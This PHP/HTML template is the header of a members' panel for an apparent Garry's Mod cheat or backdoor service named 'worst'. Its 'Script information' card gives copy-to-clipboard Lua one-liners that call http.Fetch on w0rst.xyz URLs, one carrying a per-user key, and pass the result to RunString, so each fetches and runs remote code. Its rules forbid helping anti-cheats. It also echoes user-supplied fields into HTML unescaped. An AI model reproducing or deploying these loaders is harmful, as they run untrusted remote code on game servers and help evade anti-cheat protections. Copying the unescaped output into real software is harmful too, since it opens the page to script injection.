<?php
require_once($_SERVER["DOCUMENT_ROOT"]."/beta/config.php");

if(!$Local::IsActive()) {
    $Local::Redirect("Invalid Session");
}

if($Local::IsBlacklisted()) {
    $Local::Redirect("Blacklisted");
}

if($Local::IsAdmin()) { 
    $Connections = "<a href='connections' class='nav'>Connections</a>";
}

$LocalInfo = $Local::Info();

$username = $Local::Info()['username'];
$avatar = $Local::Info()['avatar'];
$uid = $Local::Info()['uid'];

?>

<div class="navbar-header">
    <link rel="stylesheet" href="css/ripple.css">
    <script src="./js/jquery.min.js"></script>
    <script src="./js/ripple.js"></script>
    <a href="dashboard"><img class="banner" src="img/banner.png"></a>
    <button id="dropdown" class="btn transparent">
        <?php echo("<img id='avatar' class='rounded-circle header-pfp' src='$avatar' onerror=this.src='img/avatar.png'>"); ?>
        <?php echo("<span id='name'>$username</span>"); ?>
    </button>
    <div class="dropdown-settings">
        <?php echo("<a href='profile?uid=$uid'><button class='btn dropdown material-ripple' style='margin-top:2.5%;'>Profile</button></a>"); ?>
        <a href="settings"><button class="btn dropdown material-ripple" style="margin-top:2.5%;">Settings</button></a>
        <button id="script" class="btn dropdown material-ripple" style="margin-top:2.5%;">Script</button>
        <a href="core/auth/simple?request=logout"><button name="logout" class="btn dropdown material-ripple" style="margin-top:2.5%;">Logout</button></a>
    </div>
</div>
<div class="bottom-navbar">
    <a class="nav" id="info" style="cursor: pointer;">Info</a>
    <a href="members" class="nav">Members</a>
    <a href="servers" class="nav">Servers</a>
    <?php echo($Connections); ?> 
</div>
<div class="fade-background2">
    <div class="script-card">
        <h2 class="info-header" style="font-size:20px;">Script information</h2>
        <input class="input" id="c-script" value="http.Fetch('https://w0rst.xyz/project/func/load.lua', RunString)">
        <input class="input" id="c-public" value="http.Fetch('https://w0rst.xyz/project/func/napalm.php', RunString)">
        <input class="input" id="c-private" value="<?php echo("http.Fetch('https://w0rst.xyz/project/func/napalm.php?key=$userkey', RunString)"); ?>">
        <div class="top-bar">
            <button class="btn script material-ripple" id="b-script">Script</button>
            <button class="btn script material-ripple" id="b-public">Public</button>
            <button class="btn script material-ripple" id="b-private">Private</button>
        </div>
    </div>
</div>
<div class="fade-background3">
    <div class="info-card">
    <h2 class="info-header">Rules</h2>
        <span class="info-span">Breaking TOS will result in a ban of any length decided by severity. Crack attempts will result in a permanent ban, working against worst in any way for ex. snitching, scamming, anti-cheats, threat's of any kind, harassment. Remember worst is a free public script don't abuse/break these very basic rules, admins also reserve the right to ban at anytime for any reason without informing the user, for more information join our <a href="discord.php?action=join" target="_blank" style="text-decoration:none;font-weight:700;">discord</a>.</span>
    </div>
</div>
<script>
    $('#info').click(function() {
        $(".fade-background3").fadeIn(450);
    });

    $('#dropdown').click(function() {
        $(".dropdown-settings").fadeToggle("fast");
    });

    $('#script').click(function() {
        $(".fade-background2").fadeIn(450);
    })

    $(document).mouseup(function(e) { 
        if(!$(".script-card").is(e.target) && $(".script-card").has(e.target).length === 0 && $(".fade-background2").css('display') != 'none') { $(".fade-background2").fadeOut(450); }
        if(!$(".info-card").is(e.target) && $(".info-card").has(e.target).length === 0 && $(".fade-background3").css('display') != 'none') { $(".fade-background3").fadeOut(450); }
    })

    let script = document.getElementById('c-script');
    var public = document.getElementById('c-public');
    var private = document.getElementById('c-private');

    $('#b-script').click(function() { script.select(); document.execCommand("copy"); })
    $('#b-private').click(function() { private.select(); document.execCommand("copy"); })
    $('#b-public').click(function() { public.select(); document.execCommand("copy"); })
</script>